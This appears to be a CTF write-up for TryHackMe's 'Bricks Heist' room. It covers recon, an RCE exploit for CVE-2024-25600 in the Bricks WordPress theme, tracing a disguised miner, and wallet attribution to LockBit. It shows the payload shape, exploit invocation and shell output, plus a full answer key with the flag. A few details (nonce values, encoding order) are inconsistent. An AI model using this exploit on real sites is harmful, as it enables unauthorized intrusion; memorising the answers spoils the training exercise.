# 🧱 TryHack3M: Bricks Heist

<div align="center">

![TryHackMe](https://img.shields.io/badge/TryHackMe-212C42?style=for-the-badge&logo=tryhackme&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Web%20|%20Forensics%20|%20OSINT-blue?style=for-the-badge)

**From Three Million Bricks to Three Million Transactions!**

*A compromised WordPress server, a hidden crypto miner, and a trail leading to one of the most notorious ransomware groups.*

</div>

---

## 📋 Table of Contents

- [Challenge Info](#-challenge-info)
- [Reconnaissance](#-phase-1-reconnaissance)
- [Exploitation](#-phase-2-exploitation)
- [Post-Exploitation](#-phase-3-post-exploitation--investigation)
- [Answers Summary](#-answers-summary)
- [Tools Used](#%EF%B8%8F-tools-used)
- [Key Takeaways](#-key-takeaways)
- [References](#-references)

---

## 📌 Challenge Info

| Property | Value |
|----------|-------|
| **Room** | TryHack3M: Bricks Heist |
| **Difficulty** | Medium |
| **Category** | Web Exploitation, Forensics, Threat Intelligence |
| **Target** | `bricks.thm` |
| **Date** | January 2026 |

### Scenario

> Brick Press Media Co. was working on a brand-new web theme that represents a renowned wall using three million byte bricks. Agent Murphy comes with a streak of bad luck. And here we go again: the server is compromised, and they've lost access.
>
> Can you hack back the server and identify what happened there?

---

## 🔍 Phase 1: Reconnaissance

### 1.1 Initial Setup

```bash
# Add target to hosts file
echo "<Your BricksHeist Machine IP> bricks.thm" | sudo tee -a /etc/hosts
```

### 1.2 Port Scanning

```bash
rustscan -a bricks.thm --ulimit 5000 -- -sCV
```

<!-- 📸 SCREENSHOT: RustScan results -->
<details>
<summary>📸 Screenshot: RustScan Results</summary>
<img width="2559" height="1305" alt="01-rustscan-results" src="https://github.com/user-attachments/assets/3774649d-2173-4801-b846-8eaf80323255" />


</details>

#### Open Ports

| Port | Service | Version | Notes |
|:----:|---------|---------|-------|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu | Standard SSH |
| 80 | HTTP | Python WebSockify 3.8.10 | VNC proxy |
| 443 | HTTPS | Apache (WordPress 6.5) | **Main target** |

### 1.3 Web Enumeration

Accessing `https://bricks.thm` reveals a WordPress site with the **Bricks Builder** theme.

<!-- 📸 SCREENSHOT: Website homepage -->
<details>
<summary>📸 Screenshot: Website Homepage</summary>
<img width="1382" height="818" alt="02-website-page" src="https://github.com/user-attachments/assets/ed6cc578-d31f-4d68-b348-c946d0165abb" />

</details>

#### Key Findings from Page Source

```javascript
var bricksData = {
    "ajaxUrl": "https:\/\/bricks.thm\/wp-admin\/admin-ajax.php",
    "restApiUrl": "https:\/\/bricks.thm\/wp-json\/bricks\/v1\/",
    "nonce": "dce9f95a2a",    // 🔑 Critical!
    "postId": "0"
};
```

| Discovery | Value |
|-----------|-------|
| CMS | WordPress 6.5 |
| Theme | **Bricks Builder** |
| User | `administrator` |
| Nonce | `0aed3bea03` |
| phpMyAdmin | `/phpmyadmin/` |

---

## 🎯 Phase 2: Exploitation

### 2.1 Vulnerability Identification

<div align="center">

| CVE | CVSS | Type | Affected |
|-----|------|------|----------|
| **CVE-2024-25600** | **9.8 (Critical)** | Unauthenticated RCE | Bricks ≤ 1.9.6 |

</div>

#### Details

The vulnerability exists in the `prepare_query_vars_from_settings` method where user input is passed directly to PHP's `eval()` function through the REST API endpoint `/wp-json/bricks/v1/render_element`.

```
┌────────────────────────────────────────────────────────────────┐
│  Attacker                                                      │
│     │                                                          │
│     │ POST /wp-json/bricks/v1/render_element                   │
│     │ {"nonce":"xxx", "element":{"settings":{"queryEditor":    │
│     │   "throw new Exception(`id`);"}} }                       │
│     ▼                                                          │
│  WordPress + Bricks Builder                                    │
│     │                                                          │
│     │ eval($user_controlled_input)  ← RCE!                     |
│     ▼                                                          │
│  Command Execution as www-data/apache                          │
└────────────────────────────────────────────────────────────────┘
```

### 2.2 Exploit Execution

Using my **BrickBreaker** exploit:

```bash
# Install dependencies
pipx install httpx rich

# If you use pip, do this
python3 -m venv brickbreaker
source brickbreaker/bin/activate

# Launch exploit
python3 brickbreaker.py https://bricks.thm
```

<!-- 📸 SCREENSHOT: Exploit execution and shell -->
<details>
<summary>📸 Screenshot: Successful Exploitation</summary>
<img width="981" height="1040" alt="03-exploit-ui" src="https://github.com/user-attachments/assets/ebd79e0d-7445-4cd5-b01a-fd82ad2c088b" />

</details>

#### Exploit Output

```
 ██████╗ ██████╗ ██╗ ██████╗██╗  ██╗    ██████╗ ██████╗ ███████╗ █████╗ ██╗  ██╗███████╗██████╗
 ██╔══██╗██╔══██╗██║██╔════╝██║ ██╔╝    ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
 ██████╔╝██████╔╝██║██║     █████╔╝     ██████╔╝██████╔╝█████╗  ███████║█████╔╝ █████╗  ██████╔╝
 ██╔══██╗██╔══██╗██║██║     ██╔═██╗     ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
 ██████╔╝██║  ██║██║╚██████╗██║  ██╗    ██████╔╝██║  ██║███████╗██║  ██║██║  ██╗███████╗██║  ██║
 ╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

                   CVE-2024-25600 | RCE Exploit | v2.2.0 | by Constantines

✓ Nonce found: dce9f95a2a
✓ Target is VULNERABLE to CVE-2024-25600
  User: apache | Host: ip-10-81-181-56
╭───────── 🐚 BrickBreaker Shell ──────────╮
│ Shell established!                       │
│ User: apache                             │
│ Host: ip-10-81-181-56                    │
│ Type 'help' for commands, 'exit' to quit │
╰──────────────────────────────────────────╯
apache@ip-10-81-181-56:/data/www/default$ :
```

**We have shell access!** 🎉

---

## 🔎 Phase 3: Post-Exploitation & Investigation

### Q1: What is the content of the hidden .txt file in the web folder?

<details>
<summary>💡 Hint</summary>

> Answer format: `***{****_*************************************}`

</details>

#### Solution

```bash
apache@bricks:/var/www/html$ ls -la
650c844110baced87e1606453b93f22a.txt
index.php
kod
license.txt
apache@bricks:/var/www/html$ cat 650c844110baced87e1606453b93f22a.txt
THM{fl4g_650c844110baced87e1606453b93f22a}
```

<!-- 📸 SCREENSHOT: Finding the flag file -->
<details>
<summary>📸 Screenshot: Flag Discovery</summary>

<img width="969" height="1100" alt="Q1 Answer" src="https://github.com/user-attachments/assets/b498bca7-a680-46ca-986e-18e8bbca02fe" />

</details>

> **Answer:** `THM{fl4g_650c844110baced87e1606453b93f22a}`

---

### Q2: What is the name of the suspicious process?

<details>
<summary>💡 Hint</summary>

> Answer format: `************ (12 characters)`

</details>

#### Solution

Enumerate running services:

```bash
apache@bricks:/var/www/html$ systemctl | grep running
```

Found suspicious services:

| Service | Description | Status |
|---------|-------------|--------|
| `ubuntu.service` | **TRYHACK3M** | 🔴 Suspicious! |
| `badr.service` | Badr Service | 🔴 Suspicious! |

Investigating `ubuntu.service`:

```bash
apache@bricks:/var/www/html$ cat /etc/systemd/system/ubuntu.service
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog    # 👈 Malicious binary!
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

```bash
apache@bricks:/var/www/html$ systemctl status ubuntu.service
● ubuntu.service - TRYHACK3M
   Main PID: 2810 (nm-inet-dialog)
```

<!-- 📸 SCREENSHOT: Suspicious service investigation -->
<details>
<summary>📸 Screenshot: Service Analysis</summary>

<img width="1447" height="1303" alt="Q2 Answer" src="https://github.com/user-attachments/assets/5c428213-c945-4ff6-8712-42be39e3ac8d" />
<img width="838" height="274" alt="Q2 Answer 2" src="https://github.com/user-attachments/assets/9a106add-489b-488c-bf41-95b349ef4142" />
<img width="911" height="246" alt="Q2 Answer 3" src="https://github.com/user-attachments/assets/b9c4f08c-4229-410c-a047-9536ee4b0298" />

</details>

> **Answer:** `nm-inet-dialog`

---

### Q3: What is the service name affiliated with the suspicious process?

<details>
<summary>💡 Hint</summary>

> Answer format: `******.*******`

</details>

#### Solution

From the previous investigation, the malicious miner runs as a systemd service cleverly disguised with an innocent name.

> **Answer:** `ubuntu.service`

---

### Q4: What is the log file name of the miner instance?

<details>
<summary>💡 Hint</summary>

> Answer format: `****.****` (4+4 characters)

</details>

#### Solution

Analyze the miner binary for file references:

```bash
apache@bricks:/var/www/html$ strings /lib/NetworkManager/nm-inet-dialog | grep -iE "\.log|/var|/tmp"
/var/tmp
/usr/tmp
```

Check the NetworkManager directory:

```bash
apache@bricks:/var/www/html$ ls -la /lib/NetworkManager/
-rw-r--r-- 1 root root   66376 Nov  5 21:59 inet.conf    # 👈 Log file!
-rwxr-xr-x 1 root root 6948448 Apr  8  2024 nm-inet-dialog

apache@bricks:/var/www/html$ cat /lib/NetworkManager/inet.conf | head
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d30...
2025-11-05 21:57:43,607 [*] confbak: Ready!
2025-11-05 21:57:43,607 [*] Status: Mining!
2025-11-05 21:57:47,612 [*] Miner()
2025-11-05 21:57:47,612 [*] Bitcoin Miner Thread Started
```

<!-- 📸 SCREENSHOT: Miner log file -->
<details>
<summary>📸 Screenshot: Miner Log</summary>

<img width="1160" height="88" alt="Q4  Answer" src="https://github.com/user-attachments/assets/f1a66207-b9c8-4cd3-aaa4-49971ce233e6" />
<img width="817" height="446" alt="Q4 Answer 2" src="https://github.com/user-attachments/assets/07012d74-50f5-4ffa-a7f3-ca0e462692d6" />
<img width="889" height="316" alt="Q4 Answer 3" src="https://github.com/user-attachments/assets/e53f6aab-6f98-4bdd-a2ac-8acaa692c1c8" />

</details>

> **Answer:** `inet.conf`

---

### Q5: What is the wallet address of the miner instance?

<details>
<summary>💡 Hint</summary>

> Answer format: `******************************************` (42 characters)

</details>

#### Solution

The ID field in `inet.conf` is encoded. Let's decode it:

**Step 1: Extract the hex string**
```
5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
```

**Step 2: Hex → ASCII**
```bash
echo "5757314e65474e5962..." | xxd -r -p
# Output: WW1NeGNYbHJOemx0WTNBTldFHUTFhM0ps...
```

**Step 3: Base64 Decode (twice)**

Using CyberChef: `From Hex → From Base64 → From Base64`

<!-- 📸 SCREENSHOT: CyberChef decoding -->
<details>
<summary>📸 Screenshot: CyberChef Decoding</summary>

<img width="2048" height="1113" alt="Q5 Answer" src="https://github.com/user-attachments/assets/9e5129f6-e466-45a8-8a0c-57a0ae0990f1" />

</details>

**Result:**
```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
```

The wallet address is duplicated, if you look closely there is 2 bc address in one line. Extract the first and valid 42-character Bitcoin Bech32 address:

> **Answer:** `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`

---

### Q6: The wallet address used has been involved in transactions between wallets belonging to which threat group?

<details>
<summary>💡 Hint</summary>

> Answer format: `*******` (7 characters)

</details>

#### Solution

**Step 1: Blockchain Analysis**

Visit [WalletExplorer.com](https://www.walletexplorer.com/) and search for the wallet address.

<!-- 📸 SCREENSHOT: WalletExplorer search -->
<details>
<summary>📸 Screenshot: WalletExplorer</summary>

<img width="2558" height="1478" alt="Q6 Answer" src="https://github.com/user-attachments/assets/8f49a80d-e839-4dc6-a62a-6449afdf39f4" />

</details>

**Step 2: Trace Transactions**

Follow the largest transaction to wallet `[000003e028]` which is `[bbae96bd628d5fee5314]`:

| Date | Amount | Destination |
|------|--------|-------------|
| 2023-05-12 | -3.857 BTC | `32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM` |

<details>
<summary>📸 Screenshot: Transactions</summary>
<img width="1176" height="803" alt="Q6 Answer 2" src="https://github.com/user-attachments/assets/5e2f0d79-bae6-42c0-82c0-e9d56e161dca" />
<img width="1332" height="527" alt="Q6 Answer 3" src="https://github.com/user-attachments/assets/27dbe9d4-0ef5-45fb-b431-1e9d26255705" />

</details>

**Step 3: OSINT on Connected Wallet**

Google search: `32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM`

<!-- 📸 SCREENSHOT: Google/OFAC search results -->
<details>
<summary>📸 Screenshot: OFAC Sanctions List</summary>

<img width="1704" height="1431" alt="Q6 Answer 4" src="https://github.com/user-attachments/assets/5ea00819-a1c4-4b53-aef2-d88f143a76d3" />

</details>

**Step 4: OFAC Sanctions List**

The address appears in [OFAC's Cyber-related Designations](https://ofac.treasury.gov/recent-actions/20240220) dated **February 20, 2024**:

```
┌──────────────────────────────────────────────────────────────────────────┐
│  OFAC - Cyber-related Designations                                       │
│  Date: 02/20/2024                                                        │
│                                                                          │
│  "United States Sanctions Affiliates of Russia-Based                     │
│   LockBit Ransomware Group"                                              │
│                                                                          │
│  Digital Currency Address - XBT 32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM       │
└──────────────────────────────────────────────────────────────────────────┘
```

> **Answer:** `LockBit`

---

## 🏆 Answers Summary

<div align="center">

| # | Question | Answer |
|:-:|----------|--------|
| 1 | Hidden .txt file content | `THM{fl4g_650c844110baced87e1606453b93f22a}` |
| 2 | Suspicious process name | `nm-inet-dialog` |
| 3 | Service name | `ubuntu.service` |
| 4 | Miner log file | `inet.conf` |
| 5 | Wallet address | `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa` |
| 6 | Threat group | `LockBit` |

</div>

---

## 🛠️ Tools Used


<div align="center">

| Tool | Purpose | Link |
|------|---------|------|
| **RustScan** | Port scanning & vuln detection | [RustScan](https://github.com/bee-san/RustScan)) |
| **BrickBreaker** | CVE-2024-25600 exploitation | Custom-made exploit with the help from AI |
| **CyberChef** | Data decoding (hex/base64) | [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef) |
| **WalletExplorer** | Blockchain transaction analysis | [walletexplorer.com](https://www.walletexplorer.com) |
| **OFAC Database** | Threat actor attribution | [ofac.treasury.gov](https://ofac.treasury.gov) |

</div>

---

## 📚 Key Takeaways

### 1. 🔄 Patch Management
CVE-2024-25600 was disclosed in February 2024. The target was still vulnerable months later. **Keep themes and plugins updated!**

### 2. 🎭 Defense Evasion Techniques
The attacker used clever disguises:
- `nm-inet-dialog` → Mimics legitimate NetworkManager binary
- `ubuntu.service` → Blends with system services
- `inet.conf` → Looks like a config file, actually a log

### 3. 💰 Cryptocurrency Forensics
Following the money trail through blockchain analysis is a powerful attribution technique:
```
Miner Wallet → Transaction → Connected Wallet → OFAC Sanctions → LockBit
```

### 4. 🔐 Encoding Layers
Attackers use multiple encoding layers to obfuscate IOCs:
```
Wallet Address → Base64 → Base64 → Hex
```

### 5. 📖 OSINT for Attribution
Government databases like OFAC sanctions lists are goldmines for threat actor identification.

---

## 🔗 References

- [CVE-2024-25600 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-25600)
- [Bricks Builder RCE Disclosure - Snicco](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6)
- [OFAC Cyber-related Designations](https://ofac.treasury.gov/recent-actions/20240220)
- [LockBit Ransomware - CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a)
- [Original Exploit - Chocapikk](https://github.com/Chocapikk/CVE-2024-25600)

---

<div align="center">

**Written by:** constantines  
**Challenge:** TryHack3M Series  
**Date:** January 2026

---

*If you found this writeup helpful, consider giving it a ⭐!*

</div>
